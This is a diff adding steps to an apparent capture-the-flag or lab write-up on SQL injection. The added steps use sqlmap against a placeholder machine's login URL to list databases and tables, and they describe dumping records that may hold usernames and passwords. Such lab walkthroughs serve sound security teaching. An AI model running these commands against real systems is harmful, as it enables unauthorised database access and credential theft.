@@ -276,3 +276,11 @@ First, I need the full URL including the GET parameters. If it is a web form, I 
 I scan the URL using `--level=5` for maximum depth and append `--dbs` to list the databases.
 ```bash
 sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5 --dbs
+
+Step 3: Extract Tables from the Target Database
+Once I identify a target database (e.g., users), I use the -D flag to select it and --tables to see what information it holds.
+
+Bash
+sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5 -D users --tables
+Step 4: Dump the Data
+After finding an interesting table (e.g., thomas), I specify both the database and the table, then use --dump to extract the records (which often contain usernames and passwords).
